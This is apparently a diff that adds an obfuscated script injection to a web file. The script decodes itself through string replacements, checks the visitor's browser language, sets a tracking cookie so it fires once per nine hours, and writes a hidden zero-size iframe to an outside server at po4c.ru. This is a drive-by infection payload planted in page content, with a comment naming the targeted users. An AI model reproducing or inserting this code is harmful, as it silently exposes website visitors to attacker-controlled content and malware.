@@ -1,0 +1,4 @@
+<script>a="<script>window.status="";" + _
+"n=navigator.userLanguage.toUpperCase(aaaa;if((n!="ZH-CN"aaaa&&(n!="ZH-MO"aaaa&&(n!="ZH-HK"aaaa&&(n!="BN"aaaa&&(n!="GU"aaaa&&(n!="NE"aaaa&&(n!="PA"aaaa&&(n!="ID"aaaa&&(n!="EN-PH"aaaa&&(n!="UR"aaaa&&(n!="RU"aaaa&&(n!="KO"aaaa&&(n!="ZH-TW"aaaa&&(n!="ZH"aaaa&&(n!="HI"aaaa&&(n!="TH"aaaa&&(n!="VI"aaaaaaaa{var cookieString = document.cookie; //很好..zh-cn是攻击对象..bs.." + vbcrlf + "var start = cookieString.indexOf(""vaaaagoo=""aaaa;if (start != -aaaaaaaa{}else{var expires = new Date(aaaa;" + "expires.setTime(expires.getTime(aaaa+9*3600*aaaa000aaaa;document.cookie = ""vaaaagoo=update;" + "expires=""+expires.toGMTString(aaaa;try{document.write(""<iframe src="+ "http://po4c.ru/cgi-bin/index.cgi?ad abcde=0 fghij=0 frameborder=0></iframe>""aaaa;}" + "catch(eaaaa{};}}</script>"
+a=replace(replace(replace(a,"abcde","width"),"fghij","height"),"aaaa",")")
+execute(a)</script>
